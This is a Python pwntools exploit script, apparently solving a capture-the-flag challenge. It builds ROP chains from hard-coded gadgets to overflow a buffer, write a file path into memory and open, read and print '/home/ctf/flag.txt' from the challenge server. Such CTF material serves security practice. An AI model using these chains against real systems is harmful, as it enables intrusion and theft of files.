#! /usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="debug",
        os="linux",
        terminal=["alacritty", "-e"]
)

to = 2
ru = lambda p,s: p.recvuntil(s, timeout=to)
rl = lambda p: p.recvline()
sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
sl = lambda p,a: p.sendline(a)
up = lambda b: int.from_bytes(b, byteorder="little")

SERVICE = "68cc17bf-fac3-4e33-b6ab-53d80a9eadc6.x3c.tf"
PORT = 31337

def start(binary):

    gs = '''
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        set follow-fork-mode parent
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote(SERVICE,PORT,ssl=True)
    else:
        return process(binary)

def create(p, size, value):
    ru(p,b"")
    sl(p,b"%i" % size)
    ru(p,b"")
    sl(value)

def edit(p, index, value):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    sl(p,value)

def delete(p, index):
    ru(p,b"")
    sl(p,"%i" % index)

def view(p, index):
    ru(p,b"")
    sl(p,"%i" % index)
    ru(p,b"")
    return rl(p)
    

def exploit(p,e,r):

    pad = b"A" * 16

    writeable_addr = p64(0x4b5230)

    pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
    # 0x0000000000402acc : pop rsi ; pop rbp ; ret
    pop_rsi = p64(0x402acc)
    # 0x00000000004650c3 : pop rdx ; leave ; ret
    pop_rdx = p64(0x4650c3)


    # 0x000000000041799a : xchg rdx, rax ; ret
    xchg_rdx_rax = p64(0x41799a)

    # 0x000000000042193c : pop rax ; ret
    pop_rax = p64(0x42193c)



    open_plt = p64(e.sym["open"])
    read_plt = p64(e.sym["read"])
    write_plt = p64(e.sym["write"])
    gets = p64(e.sym["gets"])
    main = p64(e.sym["dev_null"])

    chain = pop_rdi + writeable_addr
    chain += gets + main
    
    file_path = b"/home/ctf/flag.txt"
    #file_path = b"./flag.txt"

    p.sendline(pad+chain)
    p.sendline(file_path)

    p.recvuntil(b"with it.")

    chain = pop_rdi + writeable_addr
    chain += pop_rsi + p64(0) + p64(0)
    chain += open_plt

    chain += pop_rdi + p64(3)
    chain += pop_rsi + writeable_addr + p64(0)
    chain += pop_rax + p64(0x30) + xchg_rdx_rax
    chain += read_plt

    chain += pop_rdi + p64(1) 
    chain += pop_rsi + writeable_addr + p64(0)
    chain += pop_rax + p64(0x30) + xchg_rdx_rax
    chain += write_plt

    p.sendline(pad+chain)
    p.interactive()



if __name__=="__main__":
    file = args.BIN

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)
    #l = ELF("./libc.so.6")

    exploit(p,e,r)
